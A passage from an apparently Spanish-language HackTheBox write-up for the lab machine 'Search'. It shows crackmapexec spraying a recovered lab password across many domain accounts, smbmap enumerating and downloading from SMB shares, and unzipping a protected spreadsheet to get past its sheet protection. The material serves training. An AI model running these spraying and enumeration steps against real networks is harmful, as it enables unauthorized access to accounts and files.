SMB         search.htb      445    RESEARCH         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:RESEARCH<span class="o">)</span> <span class="o">(</span>domain:search.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         search.htb      445    RESEARCH         <span class="o">[</span>+] search.htb<span class="se">\w</span>eb_svc:@3ONEmillionbaby
</code></pre></div></div>

<h2 id="edgarjacobs">edgar.jacobs</h2>

<ul>
  <li>Como tenemos muchos usuarios podemos probar un ataque de fuerza bruta para ver si otros usuarios reutilizan la misma contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb search.htb <span class="nt">-u</span> all.txt <span class="nt">-p</span> @3ONEmillionbaby <span class="nt">--continue-on-success</span>
➜  content crackmapexec smb search.htb <span class="nt">-u</span> all.txt <span class="nt">-p</span> @3ONEmillionbaby <span class="nt">--continue-on-success</span>
SMB         search.htb      445    RESEARCH         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:RESEARCH<span class="o">)</span> <span class="o">(</span>domain:search.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\A</span>dministrator:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\G</span>uest:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\k</span>rbtgt:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\S</span>antino.Benjamin:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\P</span>ayton.Harmon:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\T</span>race.Ryan:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\R</span>eginald.Morton:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\E</span>ddie.Stevens:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\C</span>ortez.Hickman:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\C</span>hace.Oneill:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\A</span>bril.Suarez:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\S</span>avanah.Velazquez:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\A</span>ntony.Russo:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\C</span>ameron.Melendez:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\E</span>dith.Walls:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\L</span>ane.Wu:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\A</span>rielle.Schultz:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\B</span>obby.Wolf:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\B</span>laine.Zavala:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\M</span>argaret.Robinson:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\C</span>elia.Moreno:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\K</span>aitlynn.Lee:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\K</span>yler.Arias:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\S</span>aniyah.Roy:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\S</span>arai.Boone:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\J</span>ermaine.Franco:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\A</span>lfred.Chan:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\J</span>amar.Holt:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\S</span>andra.Wolfe:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\R</span>ene.Larson:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\Y</span>areli.Mcintyre:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\G</span>riffin.Maddox:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\P</span>rince.Hobbs:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\A</span>rmando.Nash:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\S</span>onia.Schneider:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\M</span>aeve.Mann:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\L</span>izeth.Love:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\A</span>mare.Serrano:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\S</span>avanah.Knox:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\F</span>rederick.Cuevas:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\M</span>arshall.Skinner:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>+] search.htb<span class="se">\E</span>dgar.Jacobs:@3ONEmillionbaby
^C
</code></pre></div></div>

<ul>
  <li>
    <p>Y bueno el usuario <code class="language-plaintext highlighter-rouge">Edgar.Jacobs</code> reutiliza la misma contraseña.</p>
  </li>
  <li>
    <p>Vamos a listar los recursos compartidos por <code class="language-plaintext highlighter-rouge">smb</code> para el usuario <code class="language-plaintext highlighter-rouge">Edgar.Jacobs</code>.</p>
  </li>
  <li>
    <p>Vemos el <code class="language-plaintext highlighter-rouge">RedirectedFolders$</code> otra vez.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbmap <span class="nt">-H</span> 10.129.229.57 <span class="nt">-u</span> <span class="s1">'Edgar.Jacobs'</span> <span class="nt">-p</span> <span class="s1">'@3ONEmillionbaby'</span> <span class="nt">--no-banner</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>

<span class="o">[</span>+] IP: 10.129.229.57:445	Name: search.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
	helpdesk                                          	READ ONLY	
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	RedirectedFolders<span class="nv">$ </span>                               	READ, WRITE	
	SYSVOL                                            	READ ONLY	Logon server share
</code></pre></div></div>

<ul>
  <li>Vamos a ver lo que hay dentro.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbmap <span class="nt">-H</span> 10.129.229.57 <span class="nt">-u</span> <span class="s1">'Edgar.Jacobs'</span> <span class="nt">-p</span> <span class="s1">'@3ONEmillionbaby'</span> <span class="nt">--no-banner</span> <span class="nt">-r</span> <span class="s1">'RedirectedFolders$'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>

<span class="o">[</span>+] IP: 10.129.229.57:445	Name: search.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
	helpdesk                                          	READ ONLY	
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	RedirectedFolders<span class="nv">$ </span>                               	READ, WRITE	
	./RedirectedFolders<span class="err">$</span>
	dr--r--r--                0 Sun Apr  7 16:59:18 2024	<span class="nb">.</span>
	dr--r--r--                0 Sun Apr  7 16:59:18 2024	..
	dr--r--r--                0 Tue Apr  7 13:12:58 2020	abril.suarez
	dr--r--r--                0 Fri Jul 31 08:11:32 2020	Angie.Duffy
	dr--r--r--                0 Fri Jul 31 07:35:32 2020	Antony.Russo
	dr--r--r--                0 Tue Apr  7 13:32:31 2020	belen.compton
	dr--r--r--                0 Fri Jul 31 07:37:36 2020	Cameron.Melendez
	dr--r--r--                0 Tue Apr  7 13:15:09 2020	chanel.bell
	dr--r--r--                0 Fri Jul 31 08:09:07 2020	Claudia.Pugh
	dr--r--r--                0 Fri Jul 31 07:02:04 2020	Cortez.Hickman
	dr--r--r--                0 Tue Apr  7 13:20:08 2020	dax.santiago
	dr--r--r--                0 Fri Jul 31 06:55:34 2020	Eddie.Stevens
	dr--r--r--                0 Thu Apr  9 15:04:11 2020	edgar.jacobs
	dr--r--r--                0 Fri Jul 31 07:39:50 2020	Edith.Walls
	dr--r--r--                0 Tue Apr  7 13:23:13 2020	eve.galvan
	dr--r--r--                0 Tue Apr  7 13:29:22 2020	frederick.cuevas
	dr--r--r--                0 Thu Apr  9 09:34:41 2020	hope.sharp
	dr--r--r--                0 Tue Apr  7 13:07:00 2020	jayla.roberts
	dr--r--r--                0 Fri Jul 31 08:01:06 2020	Jordan.Gregory
	dr--r--r--                0 Thu Apr  9 15:11:39 2020	payton.harmon
	dr--r--r--                0 Fri Jul 31 06:44:32 2020	Reginald.Morton
	dr--r--r--                0 Tue Apr  7 13:10:25 2020	santino.benjamin
	dr--r--r--                0 Fri Jul 31 07:21:42 2020	Savanah.Velazquez
	dr--r--r--                0 Wed Nov 17 19:01:45 2021	sierra.frye
	dr--r--r--                0 Thu Apr  9 15:14:26 2020	trace.ryan
	SYSVOL                                            	READ ONLY	Logon server share
➜  content
</code></pre></div></div>

<ul>
  <li>Si nos metemos a nuestro directorio vemos que esta el <code class="language-plaintext highlighter-rouge">Desktop</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbmap <span class="nt">-H</span> 10.129.229.57 <span class="nt">-u</span> <span class="s1">'Edgar.Jacobs'</span> <span class="nt">-p</span> <span class="s1">'@3ONEmillionbaby'</span> <span class="nt">--no-banner</span> <span class="nt">-r</span> <span class="s1">'RedirectedFolders$/edgar.jacobs/'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>

<span class="o">[</span>+] IP: 10.129.229.57:445	Name: search.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
	helpdesk                                          	READ ONLY	
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	RedirectedFolders<span class="nv">$ </span>                               	READ, WRITE	
	./RedirectedFolders<span class="nv">$edgar</span>.jacobs/
	dr--r--r--                0 Thu Apr  9 15:04:11 2020	<span class="nb">.</span>
	dr--r--r--                0 Thu Apr  9 15:04:11 2020	..
	dw--w--w--                0 Mon Aug 10 05:02:16 2020	Desktop
	dw--w--w--                0 Mon Aug 10 05:02:17 2020	Documents
	dw--w--w--                0 Mon Aug 10 05:02:17 2020	Downloads
	SYSVOL                                            	READ ONLY	Logon server share
</code></pre></div></div>

<ul>
  <li>Y bueno vemos un <code class="language-plaintext highlighter-rouge">xlsx</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbmap <span class="nt">-H</span> 10.129.229.57 <span class="nt">-u</span> <span class="s1">'Edgar.Jacobs'</span> <span class="nt">-p</span> <span class="s1">'@3ONEmillionbaby'</span> <span class="nt">--no-banner</span> <span class="nt">-r</span> <span class="s1">'RedirectedFolders$/edgar.jacobs/Desktop'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>

<span class="o">[</span>+] IP: 10.129.229.57:445	Name: search.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
	helpdesk                                          	READ ONLY	
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	RedirectedFolders<span class="nv">$ </span>                               	READ, WRITE	
	./RedirectedFolders<span class="nv">$edgar</span>.jacobs/Desktop
	dw--w--w--                0 Mon Aug 10 05:02:16 2020	<span class="nb">.</span>
	dw--w--w--                0 Mon Aug 10 05:02:16 2020	..
	dr--r--r--                0 Thu Apr  9 15:05:29 2020	<span class="nv">$RECYCLE</span>.BIN
	fr--r--r--              282 Mon Aug 10 05:02:16 2020	desktop.ini
	fr--r--r--             1450 Thu Apr  9 15:05:03 2020	Microsoft Edge.lnk
	fr--r--r--            23130 Mon Aug 10 05:30:05 2020	Phishing_Attempt.xlsx
	SYSVOL                                            	READ ONLY	Logon server share
</code></pre></div></div>

<blockquote>
  <p>xlsx. Formato de archivo basado en XML y habilitado para macros de Excel 2007 a 2013. Almacena código de macros de VBA u hojas de macros de Excel 4.0 .</p>
</blockquote>

<ul>
  <li>Vamos a descargarlo para ver que es lo que hay dentro.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  document smbmap <span class="nt">-H</span> 10.129.229.57 <span class="nt">-u</span> <span class="s1">'Edgar.Jacobs'</span> <span class="nt">-p</span> <span class="s1">'@3ONEmillionbaby'</span> <span class="nt">--no-banner</span> <span class="nt">--download</span> <span class="s1">'RedirectedFolders$/edgar.jacobs/Desktop/Phishing_Attempt.xlsx'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>
<span class="o">[</span>+] Starting download: RedirectedFolders<span class="nv">$\</span>edgar.jacobs<span class="se">\D</span>esktop<span class="se">\P</span>hishing_Attempt.xlsx <span class="o">(</span>23130 bytes<span class="o">)</span>
<span class="o">[</span>+] File output to: /home/miguel/Hackthebox/Search/content/document/10.129.229.57-RedirectedFolders_edgar.jacobs_Desktop_Phishing_Attempt.xlsx
</code></pre></div></div>

<ul>
  <li>Vamos abrirlo con <code class="language-plaintext highlighter-rouge">libreoffice</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/search/7.png" />
</p>

<ul>
  <li>Vemos que la parte de <code class="language-plaintext highlighter-rouge">Passwords</code> esta protegida.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/search/8.png" />
</p>

<ul>
  <li>Vamos aplicar un <code class="language-plaintext highlighter-rouge">Bypass</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  document unzip Phishing_Attempt.xlsx
Archive:  Phishing_Attempt.xlsx
  inflating: <span class="o">[</span>Content_Types].xml
  inflating: _rels/.rels
  inflating: xl/workbook.xml
  inflating: xl/_rels/workbook.xml.rels
  inflating: xl/worksheets/sheet1.xml
  inflating: xl/worksheets/sheet2.xml
  inflating: xl/theme/theme1.xml
  inflating: xl/styles.xml
  inflating: xl/sharedStrings.xml
  inflating: xl/drawings/drawing1.xml
  inflating: xl/charts/chart1.xml
  inflating: xl/charts/style1.xml
  inflating: xl/charts/colors1.xml
  inflating: xl/worksheets/_rels/sheet1.xml.rels
  inflating: xl/worksheets/_rels/sheet2.xml.rels
  inflating: xl/drawings/_rels/drawing1.xml.rels
  inflating: xl/charts/_rels/chart1.xml.rels
  inflating: xl/printerSettings/printerSettings1.bin
  inflating: xl/printerSettings/printerSettings2.bin
  inflating: xl/calcChain.xml
  inflating: docProps/core.xml
  inflating: docProps/app.xml
</code></pre></div></div>

<ul>
  <li>Vemos que <code class="language-plaintext highlighter-rouge">hashValue</code> y mas detalles del archivo protegido.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  document <span class="nb">cat </span>xl/worksheets/sheet2.xml
&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span> <span class="nv">standalone</span><span class="o">=</span><span class="s2">"yes"</span>?&gt;
&lt;worksheet <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://schemas.openxmlformats.org/spreadsheetml/2006/main"</span> xmlns:r<span class="o">=</span><span class="s2">"http://schemas.openxmlformats.org/officeDocument/2006/relationships"</span> xmlns:mc<span class="o">=</span><span class="s2">"http://schemas.openxmlformats.org/markup-compatibility/2006"</span> mc:Ignorable<span class="o">=</span><span class="s2">"x14ac xr xr2 xr3"</span> xmlns:x14ac<span class="o">=</span><span class="s2">"http://schemas.microsoft.com/office/spreadsheetml/2009/9/ac"</span> xmlns:xr<span class="o">=</span><span class="s2">"http://schemas.microsoft.com/office/spreadsheetml/2014/revision"</span> xmlns:xr2<span class="o">=</span><span class="s2">"http://schemas.microsoft.com/office/spreadsheetml/2015/revision2"</span> xmlns:xr3<span class="o">=</span><span class="s2">"http://schemas.microsoft.com/office/spreadsheetml/2016/revision3"</span> xr:uid<span class="o">=</span><span class="s2">"{00000000-0001-0000-0100-000000000000}"</span><span class="o">&gt;</span>&lt;dimension <span class="nv">ref</span><span class="o">=</span><span class="s2">"A1:D17"</span>/&gt;&lt;sheetViews&gt;&lt;sheetView <span class="nv">tabSelected</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">workbookViewId</span><span class="o">=</span><span class="s2">"0"</span><span class="o">&gt;</span>&lt;selection <span class="nv">activeCell</span><span class="o">=</span><span class="s2">"F19"</span> <span class="nv">sqref</span><span class="o">=</span><span class="s2">"F19"</span>/&gt;&lt;/sheetView&gt;&lt;/sheetViews&gt;&lt;sheetFormatPr <span class="nv">defaultRowHeight</span><span class="o">=</span><span class="s2">"15"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span>/&gt;&lt;cols&gt;&lt;col <span class="nv">min</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">max</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">width</span><span class="o">=</span><span class="s2">"10.140625"</span> <span class="nv">bestFit</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">customWidth</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;col <span class="nv">min</span><span class="o">=</span><span class="s2">"3"</span> <span class="nv">max</span><span class="o">=</span><span class="s2">"3"</span> <span class="nv">width</span><span class="o">=</span><span class="s2">"37.5703125"</span> <span class="nv">hidden</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">customWidth</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;col <span class="nv">min</span><span class="o">=</span><span class="s2">"4"</span> <span class="nv">max</span><span class="o">=</span><span class="s2">"4"</span> <span class="nv">width</span><span class="o">=</span><span class="s2">"19.140625"</span> <span class="nv">bestFit</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">customWidth</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;/cols&gt;&lt;sheetData&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A1"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;0&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B1"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;1&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C1"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;2&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D1"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;31&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"2"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A2"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;3&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B2"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;4&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C2"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;44&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D2"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">ref</span><span class="o">=</span><span class="s2">"D2:D7"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"0"</span><span class="o">&gt;</span>A2&amp;amp<span class="p">;</span><span class="s2">"."</span>&amp;amp<span class="p">;</span>B2&lt;/f&gt;&lt;v&gt;Payton.Harmon&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"3"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A3"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;5&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B3"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;6&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C3"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;45&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D3"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"0"</span>/&gt;&lt;v&gt;Cortez.Hickman&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"4"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A4"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;7&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B4"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;8&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C4"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;46&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D4"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"0"</span>/&gt;&lt;v&gt;Bobby.Wolf&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"5"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A5"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;9&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B5"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;10&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C5"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;35&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D5"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"0"</span>/&gt;&lt;v&gt;Margaret.Robinson&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"6"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span 